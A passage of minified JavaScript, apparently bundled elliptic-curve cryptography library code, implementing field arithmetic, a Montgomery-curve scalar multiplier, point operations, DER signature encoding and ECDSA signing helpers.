Aa(t,e).reverse()}function IN(t){return Ta(ya(t))}function Yn(t,e,n){let r;if(typeof e=="string")try{r=Ta(e)}catch(o){throw new Error(t+" must be hex string or Uint8Array, cause: "+o)}else if(ro(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function bc(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Lc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}function ON(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}function $N(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const gg=t=>typeof t=="bigint"&&Of<=t;function Tf(t,e,n){return gg(t)&&gg(e)&&gg(n)&&e<=t&&t<n}function Ai(t,e,n,r){if(!Tf(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function t_(t){let e;for(e=0;t>Of;t>>=$f,e+=1);return e}function PN(t,e){return t>>BigInt(e)&$f}function TN(t,e,n){return t|(n?$f:Of)<<BigInt(e)}const Jm=t=>(SN<<BigInt(t-1))-$f,yg=t=>new Uint8Array(t),_b=t=>Uint8Array.from(t);function n_(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=yg(t),i=yg(t),o=0;const l=()=>{r.fill(1),i.fill(0),o=0},c=(...d)=>n(i,r,...d),u=(d=yg())=>{i=c(_b([0]),d),r=c(),d.length!==0&&(i=c(_b([1]),d),r=c())},f=()=>{if(o++>=1e3)throw new Error("drbg: tried 1000 values");let d=0;const y=[];for(;d<e;){r=c();const g=r.slice();y.push(g),d+=r.length}return bc(...y)};return(d,y)=>{l(),u(d);let g;for(;!(g=y(f()));)u();return l(),g}}const AN={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||ro(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Ka(t,e,n={}){const r=(i,o,l)=>{const c=AN[o];if(typeof c!="function")throw new Error("invalid validator function");const u=t[i];if(!(l&&u===void 0)&&!c(u,t))throw new Error("param "+String(i)+" is invalid. Expected "+o+", got "+u)};for(const[i,o]of Object.entries(e))r(i,o,!1);for(const[i,o]of Object.entries(n))r(i,o,!0);return t}const CN=()=>{throw new Error("not implemented")};function $y(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const o=t(n,...r);return e.set(n,o),o}}var RN=Object.freeze({__proto__:null,isBytes:ro,abytes:Lc,abool:$a,bytesToHex:Pa,numberToHexUnpadded:ya,hexToNumber:Ym,hexToBytes:Ta,bytesToNumberBE:Xs,bytesToNumberLE:vc,numberToBytesBE:Aa,numberToBytesLE:Pf,numberToVarBytesBE:IN,ensureBytes:Yn,concatBytes:bc,equalBytes:ON,utf8ToBytes:$N,inRange:Tf,aInRange:Ai,bitLen:t_,bitGet:PN,bitSet:TN,bitMask:Jm,createHmacDrbg:n_,validateObject:Ka,notImplemented:CN,memoized:$y});const Gt=BigInt(0),It=BigInt(1),Vs=BigInt(2),DN=BigInt(3),Py=BigInt(4),Ib=BigInt(5),Ob=BigInt(8);function kn(t,e){const n=t%e;return n>=Gt?n:e+n}function r_(t,e,n){if(e<Gt)throw new Error("invalid exponent, negatives unsupported");if(n<=Gt)throw new Error("invalid modulus");if(n===It)return Gt;let r=It;for(;e>Gt;)e&It&&(r=r*t%n),t=t*t%n,e>>=It;return r}function Tr(t,e,n){let r=t;for(;e-- >Gt;)r*=r,r%=n;return r}function Ty(t,e){if(t===Gt)throw new Error("invert: expected non-zero number");if(e<=Gt)throw new Error("invert: expected positive modulus, got "+e);let n=kn(t,e),r=e,i=Gt,o=It;for(;n!==Gt;){const l=r/n,c=r%n,u=i-o*l;r=n,n=c,i=o,o=u}if(r!==It)throw new Error("invert: does not exist");return kn(i,e)}function NN(t){const e=(t-It)/Vs;let n,r,i;for(n=t-It,r=0;n%Vs===Gt;n/=Vs,r++);for(i=Vs;i<t&&r_(i,e,t)!==t-It;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const l=(t+It)/Py;return function(c,u){const f=c.pow(u,l);if(!c.eql(c.sqr(f),u))throw new Error("Cannot find square root");return f}}const o=(n+It)/Vs;return function(l,c){if(l.pow(c,e)===l.neg(l.ONE))throw new Error("Cannot find square root");let u=r,f=l.pow(l.mul(l.ONE,i),n),d=l.pow(c,o),y=l.pow(c,n);for(;!l.eql(y,l.ONE);){if(l.eql(y,l.ZERO))return l.ZERO;let g=1;for(let w=l.sqr(y);g<u&&!l.eql(w,l.ONE);g++)w=l.sqr(w);const E=l.pow(f,It<<BigInt(u-g-1));f=l.sqr(E),d=l.mul(d,E),y=l.mul(y,f),u=g}return d}}function kN(t){if(t%Py===DN){const e=(t+It)/Py;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%Ob===Ib){const e=(t-Ib)/Ob;return function(n,r){const i=n.mul(r,Vs),o=n.pow(i,e),l=n.mul(r,o),c=n.mul(n.mul(l,Vs),o),u=n.mul(l,n.sub(c,n.ONE));if(!n.eql(n.sqr(u),r))throw new Error("Cannot find square root");return u}}return NN(t)}const BN=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function LN(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=BN.reduce((r,i)=>(r[i]="function",r),e);return Ka(t,n)}function jN(t,e,n){if(n<Gt)throw new Error("invalid exponent, negatives unsupported");if(n===Gt)return t.ONE;if(n===It)return e;let r=t.ONE,i=e;for(;n>Gt;)n&It&&(r=t.mul(r,i)),i=t.sqr(i),n>>=It;return r}function UN(t,e){const n=new Array(e.length),r=e.reduce((o,l,c)=>t.is0(l)?o:(n[c]=o,t.mul(o,l)),t.ONE),i=t.inv(r);return e.reduceRight((o,l,c)=>t.is0(l)?o:(n[c]=t.mul(o,n[c]),t.mul(o,l)),i),n}function i_(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function s_(t,e,n=!1,r={}){if(t<=Gt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:o}=i_(t,e);if(o>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let l;const c=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:o,MASK:Jm(i),ZERO:Gt,ONE:It,create:u=>kn(u,t),isValid:u=>{if(typeof u!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof u);return Gt<=u&&u<t},is0:u=>u===Gt,isOdd:u=>(u&It)===It,neg:u=>kn(-u,t),eql:(u,f)=>u===f,sqr:u=>kn(u*u,t),add:(u,f)=>kn(u+f,t),sub:(u,f)=>kn(u-f,t),mul:(u,f)=>kn(u*f,t),pow:(u,f)=>jN(c,u,f),div:(u,f)=>kn(u*Ty(f,t),t),sqrN:u=>u*u,addN:(u,f)=>u+f,subN:(u,f)=>u-f,mulN:(u,f)=>u*f,inv:u=>Ty(u,t),sqrt:r.sqrt||(u=>(l||(l=kN(t)),l(c,u))),invertBatch:u=>UN(c,u),cmov:(u,f,d)=>d?f:u,toBytes:u=>n?Pf(u,o):Aa(u,o),fromBytes:u=>{if(u.length!==o)throw new Error("Field.fromBytes: expected "+o+" bytes, got "+u.length);return n?vc(u):Xs(u)}});return Object.freeze(c)}function o_(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function a_(t){const e=o_(t);return e+Math.ceil(e/2)}function MN(t,e,n=!1){const r=t.length,i=o_(e),o=a_(e);if(r<16||r<o||r>1024)throw new Error("expected "+o+"-1024 bytes of input, got "+r);const l=n?vc(t):Xs(t),c=kn(l,e-It)+It;return n?Pf(c,i):Aa(c,i)}const $b=BigInt(0),vh=BigInt(1);function mg(t,e){const n=e.negate();return t?n:e}function l_(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function wg(t,e){l_(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function FN(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function zN(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const vg=new WeakMap,c_=new WeakMap;function bg(t){return c_.get(t)||1}function qN(t,e){return{constTimeNegate:mg,hasPrecomputes(n){return bg(n)!==1},unsafeLadder(n,r,i=t.ZERO){let o=n;for(;r>$b;)r&vh&&(i=i.add(o)),o=o.double(),r>>=vh;return i},precomputeWindow(n,r){const{windows:i,windowSize:o}=wg(r,e),l=[];let c=n,u=c;for(let f=0;f<i;f++){u=c,l.push(u);for(let d=1;d<o;d++)u=u.add(c),l.push(u);c=u.double()}return l},wNAF(n,r,i){const{windows:o,windowSize:l}=wg(n,e);let c=t.ZERO,u=t.BASE;const f=BigInt(2**n-1),d=2**n,y=BigInt(n);for(let g=0;g<o;g++){const E=g*l;let w=Number(i&f);i>>=y,w>l&&(w-=d,i+=vh);const b=E,m=E+Math.abs(w)-1,x=g%2!==0,S=w<0;w===0?u=u.add(mg(x,r[b])):c=c.add(mg(S,r[m]))}return{p:c,f:u}},wNAFUnsafe(n,r,i,o=t.ZERO){const{windows:l,windowSize:c}=wg(n,e),u=BigInt(2**n-1),f=2**n,d=BigInt(n);for(let y=0;y<l;y++){const g=y*c;if(i===$b)break;let E=Number(i&u);if(i>>=d,E>c&&(E-=f,i+=vh),E===0)continue;let w=r[g+Math.abs(E)-1];E<0&&(w=w.negate()),o=o.add(w)}return o},getPrecomputes(n,r,i){let o=vg.get(r);return o||(o=this.precomputeWindow(r,n),n!==1&&vg.set(r,i(o))),o},wNAFCached(n,r,i){const o=bg(n);return this.wNAF(o,this.getPrecomputes(o,n,i),r)},wNAFCachedUnsafe(n,r,i,o){const l=bg(n);return l===1?this.unsafeLadder(n,r,o):this.wNAFUnsafe(l,this.getPrecomputes(l,n,i),r,o)},setWindowSize(n,r){l_(r,e),c_.set(n,r),vg.delete(n)}}}function HN(t,e,n,r){if(FN(n,t),zN(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,o=t_(BigInt(n.length)),l=o>12?o-3:o>4?o-2:o?2:1,c=(1<<l)-1,u=new Array(c+1).fill(i),f=Math.floor((e.BITS-1)/l)*l;let d=i;for(let y=f;y>=0;y-=l){u.fill(i);for(let E=0;E<r.length;E++){const w=r[E],b=Number(w>>BigInt(y)&BigInt(c));u[b]=u[b].add(n[E])}let g=i;for(let E=u.length-1,w=i;E>0;E--)w=w.add(u[E]),g=g.add(w);if(d=d.add(g),y!==0)for(let E=0;E<l;E++)d=d.double()}return d}function u_(t){return LN(t.Fp),Ka(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...i_(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const Wo=BigInt(0),Eg=BigInt(1);function VN(t){return Ka(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})}function WN(t){const e=VN(t),{P:n}=e,r=S=>kn(S,n),i=e.montgomeryBits,o=Math.ceil(i/8),l=e.nByteLength,c=e.adjustScalarBytes||(S=>S),u=e.powPminus2||(S=>r_(S,n-BigInt(2),n));function f(S,O,$){const R=r(S*(O-$));return O=r(O-R),$=r($+R),[O,$]}const d=(e.a-BigInt(2))/BigInt(4);function y(S,O){Ai("u",S,Wo,n),Ai("scalar",O,Wo,n);const $=O,R=S;let T=Eg,D=Wo,B=S,k=Eg,G=Wo,W;for(let ne=BigInt(i-1);ne>=Wo;ne--){const j=$>>ne&Eg;G^=j,W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1],G=j;const A=T+D,C=r(A*A),U=T-D,M=r(U*U),N=C-M,V=B+k,F=B-k,q=r(F*A),Q=r(V*U),te=q+Q,se=q-Q;B=r(te*te),k=r(R*r(se*se)),T=r(C*M),D=r(N*(C+r(d*N)))}W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1];const J=u(D);return r(T*J)}function g(S){return Pf(r(S),o)}function E(S){const O=Yn("u coordinate",S,o);return l===32&&(O[31]&=127),vc(O)}function w(S){const O=Yn("scalar",S),$=O.length;if($!==o&&$!==l){let R=""+o+" or "+l;throw new Error("invalid scalar, expected "+R+" bytes, got "+$)}return vc(c(O))}function b(S,O){const $=E(O),R=w(S),T=y($,R);if(T===Wo)throw new Error("invalid private or public key received");return g(T)}const m=g(e.Gu);function x(S){return b(S,m)}return{scalarMult:b,scalarMultBase:x,getSharedSecret:(S,O)=>b(S,O),getPublicKey:S=>x(S),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:m}}const Ay=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const KN=BigInt(1),Pb=BigInt(2),GN=BigInt(3),YN=BigInt(5);BigInt(8);function JN(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),o=Ay,l=t*t%o*t%o,c=Tr(l,Pb,o)*l%o,u=Tr(c,KN,o)*t%o,f=Tr(u,YN,o)*u%o,d=Tr(f,e,o)*f%o,y=Tr(d,n,o)*d%o,g=Tr(y,r,o)*y%o,E=Tr(g,i,o)*g%o,w=Tr(E,i,o)*g%o,b=Tr(w,e,o)*f%o;return{pow_p_5_8:Tr(b,Pb,o)*t%o,b2:l}}function ZN(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}WN({P:Ay,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{const e=Ay,{pow_p_5_8:n,b2:r}=JN(t);return kn(Tr(n,GN,e)*r,e)},adjustScalarBytes:ZN,randomBytes:VS});function Tb(t){t.lowS!==void 0&&$a("lowS",t.lowS),t.prehash!==void 0&&$a("prehash",t.prehash)}function QN(t){const e=u_(t);Ka(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:XN,hexToBytes:ek}=RN;let tk=class extends Error{constructor(e=""){super(e)}};const Si={Err:tk,_tlv:{encode:(t,e)=>{const{Err:n}=Si;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=ya(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const o=r>127?ya(i.length/2|128):"";return ya(t)+o+i+e},decode(t,e){const{Err:n}=Si;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],o=!!(i&128);let l=0;if(!o)l=i;else{const u=i&127;if(!u)throw new n("tlv.decode(long): indefinite length not supported");if(u>4)throw new n("tlv.decode(long): byte length is too big");const f=e.subarray(r,r+u);if(f.length!==u)throw new n("tlv.decode: length bytes not complete");if(f[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const d of f)l=l<<8|d;if(r+=u,l<128)throw new n("tlv.decode(long): not minimal encoding")}const c=e.subarray(r,r+l);if(c.length!==l)throw new n("tlv.decode: wrong value length");return{v:c,l:e.subarray(r+l)}}},_int:{encode(t){const{Err:e}=Si;if(t<Oi)throw new e("integer: negative integers are not allowed");let n=ya(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=Si;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return XN(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=Si,i=typeof t=="string"?ek(t):t;Lc(i);const{v:o,l}=r.decode(48,i);if(l.length)throw new e("invalid signature: left bytes after parsing");const{v:c,l:u}=r.decode(2,o),{v:f,l:d}=r.decode(2,u);if(d.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(c),s:n.decode(f)}},hexFromSig(t){const{_tlv:e,_int:n}=Si,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),o=r+i;return e.encode(48,o)}},Oi=BigInt(0),qt=BigInt(1);BigInt(2);const Ab=BigInt(3);BigInt(4);function nk(t){const e=QN(t),{Fp:n}=e,r=s_(e.n,e.nBitLength),i=e.toBytes||((b,m,x)=>{const S=m.toAffine();return bc(Uint8Array.from([4]),n.toBytes(S.x),n.toBytes(S.y))}),o=e.fromBytes||(b=>{const m=b.subarray(1),x=n.fromBytes(m.subarray(0,n.BYTES)),S=n.fromBytes(m.subarray(n.BYTES,2*n.BYTES));return{x,y:S}});function l(b){const{a:m,b:x}=e,S=n.sqr(b),O=n.mul(S,b);return n.add(n.add(O,n.mul(b,m)),x)}if(!n.eql(n.sqr(e.Gy),l(e.Gx)))throw new Error("bad generator point: equation left != right");function c(b){return Tf(b,qt,e.n)}function u(b){const{allowedPrivateKeyLengths:m,nByteLength:x,wrapPrivateKey:S,n:O}=e;if(m&&typeof b!="bigint"){if(ro(b)&&(b=Pa(b)),typeof b!="string"||!m.includes(b.length))throw new Error("invalid private key");b=b.padStart(x*2,"0")}let $;try{$=typeof b=="bigint"?b:Xs(Yn("private key",b,x))}catch{throw new Error("invalid private key, expected hex or "+x+" bytes, got "+typeof b)}return S&&($=kn($,O)),Ai("private key",$,qt,O),$}function f(b){if(!(b instanceof g))throw new Error("ProjectivePoint expected")}const d=$y((b,m)=>{const{px:x,py:S,pz:O}=b;if(n.eql(O,n.ONE))return{x,y:S};const $=b.is0();m==null&&(m=$?n.ONE:n.inv(O));const R=n.mul(x,m),T=n.mul(S,m),D=n.mul(O,m);if($)return{x:n.ZERO,y:n.ZERO};if(!n.eql(D,n.ONE))throw new Error("invZ was invalid");return{x:R,y:T}}),y=$y(b=>{if(b.is0()){if(e.allowInfinityPoint&&!n.is0(b.py))return;throw new Error("bad point: ZERO")}const{x:m,y:x}=b.toAffine();if(!n.isValid(m)||!n.isValid(x))throw new Error("bad point: x or y not FE");const S=n.sqr(x),O=l(m);if(!n.eql(S,O))throw new Error("bad point: equation left != right");if(!b.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class g{constructor(m,x,S){if(this.px=m,this.py=x,this.pz=S,m==null||!n.isValid(m))throw new Error("x required");if(x==null||!n.isValid(x))throw new Error("y required");if(S==null||!n.isValid(S))throw new Error("z required");Object.freeze(this)}static fromAffine(m){const{x,y:S}=m||{};if(!m||!n.isValid(x)||!n.isValid(S))throw new Error("invalid affine point");if(m instanceof g)throw new Error("projective point not allowed");const O=$=>n.eql($,n.ZERO);return O(x)&&O(S)?g.ZERO:new g(x,S,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(m){const x=n.invertBatch(m.map(S=>S.pz));return m.map((S,O)=>S.toAffine(x[O])).map(g.fromAffine)}static fromHex(m){const x=g.fromAffine(o(Yn("pointHex",m)));return x.assertValidity(),x}static fromPrivateKey(m){return g.BASE.multiply(u(m))}static msm(m,x){return HN(g,r,m,x)}_setWindowSize(m){w.setWindowSize(this,m)}assertValidity(){y(this)}hasEvenY(){const{y:m}=this.toAffine();if(n.isOdd)return!n.isOdd(m);throw new Error("Field doesn't support isOdd")}equals(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m,D=n.eql(n.mul(x,T),n.mul($,O)),B=n.eql(n.mul(S,T),n.mul(R,O));return D&&B}negate(){return new g(this.px,n.neg(this.py),this.pz)}double(){const{a:m,b:x}=e,S=n.mul(x,Ab),{px:O,py:$,pz:R}=this;let T=n.ZERO,D=n.ZERO,B=n.ZERO,k=n.mul(O,O),G=n.mul($,$),W=n.mul(R,R),J=n.mul(O,$);return J=n.add(J,J),B=n.mul(O,R),B=n.add(B,B),T=n.mul(m,B),D=n.mul(S,W),D=n.add(T,D),T=n.sub(G,D),D=n.add(G,D),D=n.mul(T,D),T=n.mul(J,T),B=n.mul(S,B),W=n.mul(m,W),J=n.sub(k,W),J=n.mul(m,J),J=n.add(J,B),B=n.add(k,k),k=n.add(B,k),k=n.add(k,W),k=n.mul(k,J),D=n.add(D,k),W=n.mul($,R),W=n.add(W,W),k=n.mul(W,J),T=n.sub(T,k),B=n.mul(W,G),B=n.add(B,B),B=n.add(B,B),new g(T,D,B)}add(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m;let D=n.ZERO,B=n.ZERO,k=n.ZERO;const G=e.a,W=n.mul(e.b,Ab);let J=n.mul(x,$),ne=n.mul(S,R),j=n.mul(O,T),A=n.add(x,S),C=n.add($,R);A=n.mul(A,C),C=n.add(J,ne),A=n.sub(A,C),C=n.add(x,O);let U=n.add($,T);return C=n.mul(C,U),U=n.add(J,j),C=n.sub(C,U),U=n.add(S,O),D=n.add(R,T),U=n.mul(U,D),D=n.add(ne,j),U=n.sub(U,D),k=n.mul(G,C),D=n.mul(W,j),k=n.add(D,k),D=n.sub(ne,k),k=n.add(ne,k),B=n.mul(D,k),ne=n.add(J,J),ne=n.add(ne,J),j=n.mul(G,j),C=n.mul(W,C),ne=n.add(ne,j),j=n.sub(J,j),j=n.mul(G,j),C=n.add(C,j),J=n.mul(ne,C),B=n.add(B,J),J=n.mul(U,C),D=n.mul(A,D),D=n.sub(D,J),J=n.mul(A,ne),k=n.mul(U,k),k=n.add(k,J),new g(D,B,k)}subtract(m){return this.add(m.negate())}is0(){return this.equals(g.ZERO)}wNAF(m){return w.wNAFCached(this,m,g.normalizeZ)}multiplyUnsafe(m){const{endo:x,n:S}=e;Ai("scalar",m,Oi,S);const O=g.ZERO;if(m===Oi)return O;if(this.is0()||m===qt)return this;if(!x||w.hasPrecomputes(this))return w.wNAFCachedUnsafe(this,m,g.normalizeZ);let{k1neg:$,k1:R,k2neg:T,k2:D}=x.splitScalar(m),B=O,k=O,G=this;for(;R>Oi||D>Oi;)R&qt&&(B=B.add(G)),D&qt&&(k=k.add(G)),G=G.double(),R>>=qt,D>>=qt;return $&&(B=B.negate()),T&&(k=k.negate()),k=new g(n.mul(k.px,x.beta),k.py,k.pz),B.add(k)}multiply(m){const{endo:x,n:S}=e;Ai("scalar",m,qt,S);let O,$;if(x){const{k1neg:R,k1:T,k2neg:D,k2:B}=x.splitScalar(m);let{p:k,f:G}=this.wNAF(T),{p:W,f:J}=this.wNAF(B);k=w.constTimeNegate(R,k),W=w.constTimeNegate(D,W),W=new g(n.mul(W.px,x.beta),W.py,W.pz),O=k.add(W),$=G.add(J)}else{const{p:R,f:T}=this.wNAF(m);O=R,$=T}return g.normalizeZ([O,$])[0]}multiplyAndAddUnsafe(m,x,S){const O=g.BASE,$=(T,D)=>D===Oi||D===qt||!T.equals(O)?T.multiplyUnsafe(D):T.multiply(D),R=$(this,x).add($(m,S));return R.is0()?void 0:R}toAffine(m){return d(this,m)}isTorsionFree(){const{h:m,isTorsionFree:x}=e;if(m===qt)return!0;if(x)return x(g,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:m,clearCofactor:x}=e;return m===qt?this:x?x(g,this):this.multiplyUnsafe(e.h)}toRawBytes(m=!0){return $a("isCompressed",m),this.assertValidity(),i(g,this,m)}toHex(m=!0){return $a("isCompressed",m),Pa(this.toRawBytes(m))}}g.BASE=new g(e.Gx,e.Gy,n.ONE),g.ZERO=new g(n.ZERO,n.ONE,n.ZERO);const E=e.nBitLength,w=qN(g,e.endo?Math.ceil(E/2):E);return{CURVE:e,ProjectivePoint:g,normPrivateKeyToScalar:u,weierstrassEquation:l,isWithinCurveOrder:c}}function rk(t){const e=u_(t);return Ka(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function ik(t){const e=rk(t),{Fp:n,n:r}=e,i=n.BYTES+1,o=2*n.BYTES+1;function l(j){return kn(j,r)}function c(j){return Ty(j,r)}const{ProjectivePoint:u,normPrivateKeyToScalar:f,weierstrassEquation:d,isWithinCurveOrder:y}=nk({...e,toBytes(j,A,C){const U=A.toAffine(),M=n.toBytes(U.x),N=bc;return $a("isCompressed",C),C?N(Uint8Array.from([A.hasEvenY()?2:3]),M):N(Uint8Array.from([4]),M,n.toBytes(U.y))},fromBytes(j){const A=j.length,C=j[0],U=j.subarray(1);if(A===i&&(C===2||C===3)){const M=Xs(U);if(!Tf(M,qt,n.ORDER))throw new Error("Point is not on curve");const N=d(M);let V;try{V=n.sqrt(N)}catch(q){const Q=q instanceof Error?": "+q.message:"";throw new Error("Point is not on curve"+Q)}const F=(V&qt)===qt;return(C&1)===1!==F&&(V=n.neg(V)),{x:M,y:V}}else if(A===o&&C===4){const M=n.fromBytes(U.subarray(0,n.BYTES)),N=n.fromBytes(U.subarray(n.BYTES,2*n.BYTES));return{x:M,y:N}}else{const M=i,N=o;throw new Error("invalid Point, expected length of "+M+", or uncompressed "+N+", got "+A)}}}),g=j=>Pa(Aa(j,e.nByteLength));function E(j){const A=r>>qt;return j>A}function w(j){return E(j)?l(-j):j}const b=(j,A,C)=>Xs(j.slice(A,C));class m{constructor(A,C,U){this.r=A,this.s=C,this.recovery=U,this.assertValidity()}static fromCompact(A){const C=e.nByteLength;return A=Yn("compactSignature",A,C*2),new m(b(A,0,C),b(A,C,2*C))}static fromDER(A){const{r:C,s:U}=Si.toSig(Yn("DER",A));return new m(C,U)}assertValidity(){Ai("r",this.r,qt,r),Ai("s",this.s,qt,r)}addRecoveryBit(A){return new m(this.r,this.s,A)}recoverPublicKey(A){const{r:C,s:U,recovery:M}=this,N=T(Yn("msgHash",A));if(M==null||![0,1,2,3].includes(M))throw new Error("recovery id invalid");const V=M===2||M===3?C+e.n:C;if(V>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const F=(M&1)===0?"02":"03",q=u.fromHex(F+g(V)),Q=c(V),te=l(-N*Q),se=l(U*Q),le=u.BASE.multiplyAndAddUnsafe(q,te,se);if(!le)throw new Error("point at infinify");return le.assertValidity(),le}hasHighS(){return E(this.s)}normalizeS(){return this.hasHighS()?new m(this.r,l(-this.s),this.recovery):this}toDERRawBytes(){return Ta(this.toDERHex())}toDERHex(){return Si.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Ta(this.toCompactHex())}toCompactHex(){return g(this.r)+g(this.s)}}const x={isValidPrivateKey(j){try{return f(j),!0}catch{return!1}},normPrivateKeyToScalar:f,randomPrivateKey:()=>{const j=a_(e.n);return MN(e.randomBytes(j),e.n)},precompute(j=8,A=u.BASE){return A._setWindowSize(j),A.multiply(BigInt(3)),A}};function S(j,A=!0){return u.fromPrivateKey(j).toRawBytes(A)}function O(j){const A=ro(j),C=typeof j=="string",U=(A||C)&&j.length;return A?U===i||U===o:C?U===2*i||U===2*o:j instanceof u}function $(j,A,C=!0){if(O(j))throw new Error("first arg must be private key");if(!O(A))throw new Error("second arg must be public key");return u.fromHex(A).multiply(f(j)).toRawBytes(C)}const R=e.bits2int||function(j){if(j.length>8192)throw new Error("input is too large");const A=Xs(j),C=j.length*8-e.nBitLength;return C>0?A>>BigInt(C):A},T=e.bits2int_modN||function(j){return l(R(j))},D=Jm(e.nBitLength);function B(j){return Ai("num < 2^"+e.nBitLength,j,Oi,D),Aa(j,e.nByteLength)}function k(j,A,C=G){if(["recovered","canonical"].some(he=>he in C))throw new Error("sign() legacy options not supported");const{hash:U,randomBytes:M}=e;let{lowS:N,prehash:V,extraEntropy:F}=C;N==null&&(N=!0),j=Yn("msgHash",j),Tb(C),V&&(j=Yn("prehashed msgHash",U(j)));const q=T(j),Q=f(A),te=[B(Q),B(q)];if(F!=null&&F!==!1){const he=F===!0?M(n.BYTES):F;te.push(Yn("extraEntropy",he))}const se=bc(...te),le=q;function pe(he){const fe=R(he);if(!y(fe))return;const xe=c(fe),Oe=u.BASE.multiply(fe).toAffine(),Pe=l(Oe.x);if(Pe===Oi)return;const Re=l(xe*l(le+Pe*Q));if(Re===Oi)return;let Ue=(Oe.x===Pe?0:2)|Number(Oe.y&qt),Zt=Re;return N&&E(Re)&&(Zt=w(Re),Ue^=1),new m(Pe,Zt,Ue)}return{seed:se,k2sig:pe}}const G={lowS:e.lowS,prehash:!1},W={lowS:e.lowS,prehash:!1};function J(j,A,C=G){const{seed:U,k2sig:M}=k(j,A,C),N=e;return 